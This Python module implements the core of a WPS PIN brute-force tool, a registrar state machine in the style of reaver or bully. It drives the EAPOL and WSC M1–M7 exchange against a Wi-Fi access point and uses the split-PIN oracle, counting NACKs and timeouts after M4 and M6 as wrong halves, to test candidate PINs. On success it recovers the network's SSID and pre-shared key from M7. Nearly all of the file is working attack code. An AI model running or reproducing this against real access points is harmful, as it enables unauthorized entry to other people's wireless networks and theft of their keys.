"""WpsRegistrar — the per-PIN EAP/WSC state machine (transport-agnostic).

Drives one PIN attempt as an external WPS Registrar against an Enrollee (the
AP). Knows nothing about USB: it is handed a transport with ``send(frame)`` /
``recv(timeout)`` and builds/parses full 802.11 data frames via ``messages``.
The live adapter (``association.WlanTransport``) wires this to
``WlanInterface.send_raw`` + ``register_rx_callback``; tests wire it to an
in-process fake enrollee.

The split-PIN oracle, mapped from what arrives after each message we send:

    after M4 :  M5  -> first half correct      NACK/EAP-FAIL/timeout -> FIRST_HALF_WRONG
    after M6 :  M7  -> SUCCESS (extract PSK)    NACK/EAP-FAIL/timeout -> SECOND_HALF_WRONG

Timeout-as-NACK (reaver's default for the M5/M7 waits) lets the sweep advance
against APs that silently drop instead of NACKing.
"""

from __future__ import annotations

import logging
import os
import time
from dataclasses import dataclass
from enum import Enum
from typing import Optional, Protocol

from . import messages as M
from . import wsc_crypto as wc

logger = logging.getLogger(__name__)


class WpsTransport(Protocol):
    async def send(self, frame: bytes) -> None: ...
    async def recv(self, timeout: float) -> Optional[bytes]: ...


class PinResult(Enum):
    SUCCESS = "success"
    FIRST_HALF_WRONG = "first_half_wrong"
    SECOND_HALF_WRONG = "second_half_wrong"
    TIMEOUT = "timeout"
    PROTO_ERROR = "proto_error"           # rejected before the M4 oracle (e.g. locked)


@dataclass
class AttemptOutcome:
    result: PinResult
    pin: str = ""
    psk: Optional[str] = None             # Network Key recovered from M7, on SUCCESS
    ssid: Optional[str] = None
    detail: str = ""

    @property
    def first_half_ok(self) -> bool:
        return self.result in (PinResult.SECOND_HALF_WRONG, PinResult.SUCCESS)


class WpsRegistrar:
    def __init__(
        self,
        transport: WpsTransport,
        bssid: bytes,
        our_mac: bytes,
        msg_timeout: float = 3.0,
        eapol_start_timeout: float = 2.0,
        overall_timeout: float = 25.0,
        log=None,
    ):
        self.t = transport
        self.bssid = bssid
        self.our_mac = our_mac
        # Per-message receive window. A cheap AP can take seconds to compute the
        # next WSC message (DH + key derivation), so this is deliberately
        # generous; bully seeds its M3 wait in the tens of seconds.
        self.msg_timeout = msg_timeout
        self.eapol_start_timeout = eapol_start_timeout
        self.overall_timeout = overall_timeout
        self.log = log or logger.debug

    async def _send_1x(self, payload_1x: bytes) -> None:
        frame = M.build_data_frame(self.bssid, self.our_mac, self.bssid, payload_1x)
        await self.t.send(frame)

    async def try_pin(self, pin: str) -> AttemptOutcome:
        """Run one full EAPOL-Start→M1..M7 exchange for ``pin``."""
        # Fresh per-attempt session state.
        priv, pkr = wc.dh_generate_keypair()
        nonce_r = os.urandom(wc.NONCE_LEN)
        uuid_r = os.urandom(16)
        r_s1 = os.urandom(wc.SECRET_NONCE_LEN)
        r_s2 = os.urandom(wc.SECRET_NONCE_LEN)

        pke = nonce_e = authkey = keywrapkey = psk1 = psk2 = None
        last_sent: Optional[str] = None         # 'M4' or 'M6' — what the oracle is pending on
        # Highest WSC message type handled. WSC never runs backward, so a
        # received message older than this is a stale (no-ACK) retransmit — we
        # answer the *current* stage (retry insurance) but ignore older ones,
        # rather than re-emitting a stale M2 after we've moved on to M4.
        highest_mt = 0

        await self._send_1x(M.eapol_start())
        self.log(f"[WPS] -> EAPOL-Start (pin {pin})")

        # The AP retransmits each message because our injected STA never sends an
        # 802.11 ACK (it's not a firmware-level client, so hardware auto-ACK never
        # fires). We reply to every retransmit of the CURRENT stage — our only
        # delivery insurance, since we TX no-ACK — but the stale-message guard
        # below drops retransmits of stages we've already passed.
        overall_deadline = time.monotonic() + self.overall_timeout
        timeout = self.eapol_start_timeout
        while time.monotonic() < overall_deadline:
            frame = await self.t.recv(min(timeout, overall_deadline - time.monotonic()))
            timeout = self.msg_timeout
            if frame is None:
                # No reply within the window. After M4/M6 a silent drop is the
                # half-wrong oracle (reaver's timeout-as-NACK); otherwise the AP
                # just isn't talking.
                if last_sent == "M4":
                    return AttemptOutcome(PinResult.FIRST_HALF_WRONG, pin, detail="timeout after M4")
                if last_sent == "M6":
                    return AttemptOutcome(PinResult.SECOND_HALF_WRONG, pin, detail="timeout after M6")
                return AttemptOutcome(PinResult.TIMEOUT, pin, detail="no EAP response")

            p = M.parse_rx_frame(frame)
            if p is None:
                continue

            if p.is_identity_request:
                if highest_mt == 0:          # ignore identity retransmits once WSC starts
                    self.log(f"[WPS] <- EAP-Req/Identity (id {p.eap_id}); -> Identity response")
                    await self._send_1x(M.eap_identity_response(p.eap_id))
                continue

            if p.is_eap_failure or p.wsc_msg_type == M.WPS_WSC_NACK:
                self.log(f"[WPS] <- {'EAP-FAIL' if p.is_eap_failure else 'WSC_NACK'} (last_sent={last_sent})")
                return self._oracle_from_nack(pin, last_sent)

            mt = p.wsc_msg_type
            if mt and mt < highest_mt:
                continue                     # stale retransmit of a stage we've already passed
            if mt in (M.WPS_M1, M.WPS_M3, M.WPS_M5, M.WPS_M7):
                highest_mt = mt
            if mt == M.WPS_M1:
                pke = p.attrs.get(M.ATTR_PUBLIC_KEY)
                nonce_e = p.attrs.get(M.ATTR_ENROLLEE_NONCE)
                mac_e = p.attrs.get(M.ATTR_MAC_ADDR, self.bssid)
                if not pke or not nonce_e:
                    return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="M1 missing PKe/nonce")
                shared = wc.dh_shared_secret(pke, priv)
                authkey, keywrapkey, _ = wc.derive_keys(shared, nonce_e, mac_e, nonce_r)
                psk1, psk2 = wc.derive_psk(authkey, pin)
                m2 = M.build_m2(nonce_e, nonce_r, uuid_r, pkr, authkey, p.raw_wsc_attrs)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m2))
                self.log(f"[WPS] <- M1 (id {p.eap_id}, {len(p.raw_wsc_attrs)}B); -> M2")

            elif mt == M.WPS_M3:
                if authkey is None:
                    return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="M3 before keys")
                m4 = M.build_m4(nonce_e, r_s1, r_s2, psk1, psk2, pke, pkr,
                                authkey, keywrapkey, p.raw_wsc_attrs)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m4))
                last_sent = "M4"
                self.log(f"[WPS] <- M3 (id {p.eap_id}); -> M4 (revealing R-S1, testing first half)")

            elif mt == M.WPS_M5:
                # First half accepted. Reveal R-S2 in M6 to test the second half.
                m6 = M.build_m6(nonce_e, r_s2, authkey, keywrapkey, p.raw_wsc_attrs)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m6))
                last_sent = "M6"
                self.log(f"[WPS] <- M5 (id {p.eap_id}) -> first half CORRECT; -> M6 (testing second half)")

            elif mt == M.WPS_M7:
                ssid, psk = self._extract_psk(p, keywrapkey)
                self.log(f"[WPS] <- M7 (id {p.eap_id}) -> SUCCESS; PSK={psk!r}")
                # Tear the session down politely (best-effort).
                nack = M.build_wsc_nack(nonce_e, nonce_r)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_NACK, nack))
                return AttemptOutcome(PinResult.SUCCESS, pin, psk=psk, ssid=ssid)

            else:
                # M2D or unexpected — treat as a setup rejection (often a lock).
                if mt == M.WPS_M2D:
                    return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="M2D (AP has no registrar)")
                self.log(f"[WPS] <- unexpected msg_type=0x{mt:02x}, ignoring")
                continue

        return AttemptOutcome(PinResult.TIMEOUT, pin, detail="exchange did not converge")

    @staticmethod
    def _oracle_from_nack(pin: str, last_sent: Optional[str]) -> AttemptOutcome:
        if last_sent == "M4":
            return AttemptOutcome(PinResult.FIRST_HALF_WRONG, pin, detail="NACK after M4")
        if last_sent == "M6":
            return AttemptOutcome(PinResult.SECOND_HALF_WRONG, pin, detail="NACK after M6")
        return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="NACK before oracle")

    @staticmethod
    def _extract_psk(p, keywrapkey):
        enc = p.attrs.get(M.ATTR_ENCR_SETTINGS)
        if not enc or keywrapkey is None:
            return None, None
        creds = M.extract_m7_credentials(enc, keywrapkey)
        if not creds:
            return None, None
        ssid = creds.get("ssid")
        key = creds.get("network_key")
        return (
            ssid.decode("utf-8", "replace") if ssid else None,
            key.decode("utf-8", "replace") if key else None,
        )
